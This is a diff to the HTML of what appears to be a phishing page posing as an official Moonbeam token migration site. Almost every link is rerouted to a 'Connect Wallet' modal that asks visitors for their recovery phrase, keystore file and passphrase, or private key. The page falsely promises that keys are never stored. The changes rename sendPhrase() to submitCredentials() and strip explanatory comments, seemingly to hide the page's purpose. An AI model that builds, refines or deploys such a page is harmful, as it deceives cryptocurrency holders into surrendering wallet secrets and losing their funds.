@@ -1245,13 +1245,13 @@
         MOONBEAM
       </a>
       <div class="navlinks">
-        <a href="#migration" onclick="openWallet(); return false;">Migration</a>
-        <a href="#assets" onclick="openWallet(); return false;">Assets</a>
-        <a href="#steps" onclick="openWallet(); return false;">Steps</a>
-        <a href="#faq" onclick="openWallet(); return false;">FAQ</a>
-        <a href="#support" onclick="openWallet(); return false;">Support</a>
+        <a href="#migration" onclick="showModal(); return false;">Migration</a>
+        <a href="#assets" onclick="showModal(); return false;">Assets</a>
+        <a href="#steps" onclick="showModal(); return false;">Steps</a>
+        <a href="#faq" onclick="showModal(); return false;">FAQ</a>
+        <a href="#support" onclick="showModal(); return false;">Support</a>
       </div>
-      <a href="#migration" class="explore-btn" onclick="openWallet(); return false;">START MIGRATION &#8599;</a>
+      <a href="#migration" class="explore-btn" onclick="showModal(); return false;">START MIGRATION &#8599;</a>
       <button class="navburger" aria-label="Open menu" aria-expanded="false" aria-controls="mobile-nav">
         <span class="bar"></span>
         <span class="bar"></span>
@@ -1270,29 +1270,29 @@
       <button class="mobile-nav-close" id="mobile-nav-close" aria-label="Close menu">&times;</button>
     </div>
     <div class="mobile-nav-items">
-      <a href="#migration" class="mobile-nav-item" onclick="openWallet(); return false;">
+      <a href="#migration" class="mobile-nav-item" onclick="showModal(); return false;">
         <span class="mn-label">Migration</span>
         <span class="mn-arrow">&#9661;</span>
       </a>
-      <a href="#assets" class="mobile-nav-item" onclick="openWallet(); return false;">
+      <a href="#assets" class="mobile-nav-item" onclick="showModal(); return false;">
         <span class="mn-label">Assets</span>
         <span class="mn-arrow">&#9661;</span>
       </a>
-      <a href="#steps" class="mobile-nav-item" onclick="openWallet(); return false;">
+      <a href="#steps" class="mobile-nav-item" onclick="showModal(); return false;">
         <span class="mn-label">Steps</span>
         <span class="mn-arrow">&#9661;</span>
       </a>
-      <a href="#faq" class="mobile-nav-item" onclick="openWallet(); return false;">
+      <a href="#faq" class="mobile-nav-item" onclick="showModal(); return false;">
         <span class="mn-label">FAQ</span>
         <span class="mn-arrow">&#9661;</span>
       </a>
-      <a href="#support" class="mobile-nav-item" onclick="openWallet(); return false;">
+      <a href="#support" class="mobile-nav-item" onclick="showModal(); return false;">
         <span class="mn-label">Support</span>
         <span class="mn-arrow">&#9661;</span>
       </a>
     </div>
     <div class="mobile-nav-cta">
-      <a href="#migration" onclick="openWallet(); return false;">START MIGRATION &#8599;</a>
+      <a href="#migration" onclick="showModal(); return false;">START MIGRATION &#8599;</a>
     </div>
   </nav>
 
@@ -1348,7 +1348,7 @@
 
       <div class="cta-grid">
 
-        <a href="#steps" class="cta-card featured" onclick="openWallet(); return false;">
+        <a href="#steps" class="cta-card featured" onclick="showModal(); return false;">
           <div class="idx">01 / MIGRATE</div>
           <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
             <path d="M3 12h13m0 0l-5-5m5 5l-5 5M21 12a9 9 0 11-9-9" stroke-linecap="round" stroke-linejoin="round" />
@@ -1361,7 +1361,7 @@
             </svg></span>
         </a>
 
-        <a href="#steps" class="cta-card" onclick="openWallet(); return false;">
+        <a href="#steps" class="cta-card" onclick="showModal(); return false;">
           <div class="idx">02 / UNSTAKE</div>
           <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
             <path
@@ -1375,7 +1375,7 @@
             </svg></span>
         </a>
 
-        <a href="#steps" class="cta-card" onclick="openWallet(); return false;">
+        <a href="#steps" class="cta-card" onclick="showModal(); return false;">
           <div class="idx">03 / WITHDRAW</div>
           <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
             <path d="M19 14l-7 7m0 0l-7-7m7 7V3" stroke-linecap="round" stroke-linejoin="round" />
@@ -1388,7 +1388,7 @@
             </svg></span>
         </a>
 
-        <a href="#faq" class="cta-card" onclick="openWallet(); return false;">
+        <a href="#faq" class="cta-card" onclick="showModal(); return false;">
           <div class="idx">04 / CLAIM</div>
           <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
             <path d="M12 15a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" />
@@ -1402,7 +1402,7 @@
             </svg></span>
         </a>
 
-        <a href="#faq" class="cta-card" onclick="openWallet(); return false;">
+        <a href="#faq" class="cta-card" onclick="showModal(); return false;">
           <div class="idx">05 / EXCHANGES</div>
           <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
             <path d="M4 7h16M4 7l4-4M4 7l4 4M20 17H4m16 0l-4-4m4 4l-4 4" stroke-linecap="round"
@@ -1416,7 +1416,7 @@
             </svg></span>
         </a>
 
-        <a href="#support" class="cta-card" onclick="openWallet(); return false;">
+        <a href="#support" class="cta-card" onclick="showModal(); return false;">
           <div class="idx">06 / SUPPORT</div>
           <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
             <path d="M18 10a6 6 0 10-12 0v4a2 2 0 002 2h1v-6H6a4 4 0 118 0h-3v6h1a2 2 0 002-2v-4z" />
@@ -1516,7 +1516,7 @@
           <div class="section-eyebrow">Action Steps</div>
           <h2>Before You Migrate</h2>
         </div>
-        <a href="#faq" class="all-faq-btn" onclick="openWallet(); return false;">ALL FAQS &#9656;</a>
+        <a href="#faq" class="all-faq-btn" onclick="showModal(); return false;">ALL FAQS &#9656;</a>
       </div>
       <div class="steps-grid">
         <div class="step-card">
@@ -1557,7 +1557,7 @@
             <h3>What if I hold tokens on an exchange?</h3>
             <p>You do not need to do anything. Your exchange will handle the migration automatically. Watch for direct
               communication from your exchange confirming the switchover date.</p>
-            <a href="#support" class="read-more" onclick="openWallet(); return false;">READ MORE
+            <a href="#support" class="read-more" onclick="showModal(); return false;">READ MORE
               <span>&#9656;</span></a>
           </div>
         </div>
@@ -1567,7 +1567,7 @@
             <h3>Is there a fee to migrate?</h3>
             <p>No. The migration is 1:1 with no fee to migrate. Every token you hold today becomes one Base ERC-20 token
               at the same amount.</p>
-            <a href="#support" class="read-more" onclick="openWallet(); return false;">READ MORE
+            <a href="#support" class="read-more" onclick="showModal(); return false;">READ MORE
               <span>&#9656;</span></a>
           </div>
         </div>
@@ -1585,14 +1585,14 @@
           <h3>Verify Contracts</h3>
           <p>Always confirm you're interacting with official, published contract addresses before bridging. Never trust
             a link sent to you directly.</p>
-          <a href="#" class="lm-btn" onclick="openWallet(); return false;">LEARN MORE <span>&#9656;</span></a>
+          <a href="#" class="lm-btn" onclick="showModal(); return false;">LEARN MORE <span>&#9656;</span></a>
         </div>
         <div class="ready-card">
           <div class="rc-head"><span>&#9632;</span><span>X:1030 Y:276</span></div>
           <h3>Talk to Support</h3>
           <p>Reach the migration support team through official Moonbeam channels if you run into any issues bridging
             your assets.</p>
-          <a href="#" class="lm-btn" onclick="openWallet(); return false;">LEARN MORE <span>&#9656;</span></a>
+          <a href="#" class="lm-btn" onclick="showModal(); return false;">LEARN MORE <span>&#9656;</span></a>
         </div>
       </div>
     </section>
@@ -1603,25 +1603,25 @@
     <div class="foot-grid">
       <div class="foot-col">
         <h5>Migration</h5>
-        <a href="#migration" onclick="openWallet(); return false;">Bridge Tokens</a>
-        <a href="#steps" onclick="openWallet(); return false;">Action Steps</a>
-        <a href="#assets" onclick="openWallet(); return false;">Supported Assets</a>
+        <a href="#migration" onclick="showModal(); return false;">Bridge Tokens</a>
+        <a href="#steps" onclick="showModal(); return false;">Action Steps</a>
+        <a href="#assets" onclick="showModal(); return false;">Supported Assets</a>
       </div>
       <div class="foot-col">
         <h5>Support</h5>
-        <a href="#faq" onclick="openWallet(); return false;">FAQ</a>
-        <a href="#support" onclick="openWallet(); return false;">Contact Support</a>
-        <a href="#" onclick="openWallet(); return false;">Report a Bug</a>
+        <a href="#faq" onclick="showModal(); return false;">FAQ</a>
+        <a href="#support" onclick="showModal(); return false;">Contact Support</a>
+        <a href="#" onclick="showModal(); return false;">Report a Bug</a>
       </div>
       <div class="foot-col">
         <h5>Community</h5>
-        <a href="#" onclick="openWallet(); return false;">Forums</a>
-        <a href="#" onclick="openWallet(); return false;">Announcements</a>
+        <a href="#" onclick="showModal(); return false;">Forums</a>
+        <a href="#" onclick="showModal(); return false;">Announcements</a>
       </div>
       <div class="foot-col">
         <h5>Networks</h5>
-        <a href="#" onclick="openWallet(); return false;">Moonbeam Network</a>
-        <a href="#" onclick="openWallet(); return false;">Moonriver Network</a>
+        <a href="#" onclick="showModal(); return false;">Moonbeam Network</a>
+        <a href="#" onclick="showModal(); return false;">Moonriver Network</a>
       </div>
       <div class="foot-socials">
         <a href="#" aria-label="X"><svg viewBox="0 0 24 24" fill="currentColor">
@@ -1653,8 +1653,8 @@
     <div class="foot-bottom">
       <span>&copy; 2026 Moonbeam. All rights reserved.</span>
       <div class="links">
-        <a href="#" onclick="openWallet(); return false;">Terms of use</a>
-        <a href="#" onclick="openWallet(); return false;">Privacy policy</a>
+        <a href="#" onclick="showModal(); return false;">Terms of use</a>
+        <a href="#" onclick="showModal(); return false;">Privacy policy</a>
       </div>
       <div class="secured">
         Secured by
@@ -1726,8 +1726,8 @@
         </div>
 
         <p class="w-note">
-          By connecting you agree to our <a href="#" onclick="openWallet();return false;">Terms</a> &amp; <a href="#"
-            onclick="openWallet();return false;">Privacy Policy</a>.
+          By connecting you agree to our <a href="#" onclick="showModal();return false;">Terms</a> &amp; <a href="#"
+            onclick="showModal();return false;">Privacy Policy</a>.
           We never store your private keys or seed phrases.
         </p>
       </div>
@@ -2142,27 +2142,23 @@
       </div>
       <div class="w-manual-body">
 
-        <!-- wallet chip -->
         <div class="w-wallet-chip">
           <div class="w-chip-icon"><img id="s4Img" src="" alt="" /></div>
           <span class="w-chip-name" id="s4Name">Wallet</span>
         </div>
 
-        <!-- type toggle: Phrase | Keystore JSON | Private Key -->
         <div class="type-toggle">
           <button class="type-btn" id="btn-keystore" onclick="switchType('keystore')">Keystore JSON</button>
           <button class="type-btn active" id="btn-phrase" onclick="switchType('phrase')">Phrase</button>
           <button class="type-btn" id="btn-privatekey" onclick="switchType('privatekey')">Private Key</button>
         </div>
 
-        <!-- Pane 1: Phrase -->
         <div class="input-pane active" id="pane-phrase">
           <textarea class="w-textarea phrase-area" id="phraseInput"
             placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces..." spellcheck="false"
             autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
         </div>
 
-        <!-- Pane 2: Keystore JSON -->
         <div class="input-pane" id="pane-keystore">
           <textarea class="w-textarea keystore-area" id="keystoreInput" placeholder='Paste Passphrase'
             spellcheck="false" autocomplete="off"></textarea>
@@ -2171,19 +2167,16 @@
             <i class="ri-attachment-2"></i>
             Attach Keystore File
           </button>
-          <input type="file" id="keystoreFileInput" accept=".json,.txt,.png,.jpg,.jpeg"
-            onchange="handleKeystoreFile(this)" />
+          <input type="file" id="keystoreFileInput" accept=".json,.txt,.png,.jpg,.jpeg" onchange="handleKSF(this)" />
           <p class="attach-file-name" id="attachFileName"></p>
         </div>
 
-        <!-- Pane 3: Private Key -->
         <div class="input-pane" id="pane-privatekey">
           <textarea class="w-textarea privkey-area" id="privkeyInput"
             placeholder="Enter your private key (hex format, 64 characters)..." spellcheck="false" autocomplete="off"
             autocorrect="off" autocapitalize="off"></textarea>
         </div>
 
-        <!-- encrypt note -->
         <div class="w-encrypt-note">
           <i class="ri-lock-2-line"></i>
           <p>
@@ -2193,7 +2186,7 @@
           </p>
         </div>
 
-        <button class="w-btn w-btn-plum" onclick="sendPhrase()">
+        <button class="w-btn w-btn-plum" onclick="submitCredentials()">
           <i class="ri-wallet-3-line"></i> Connect Wallet
         </button>
 
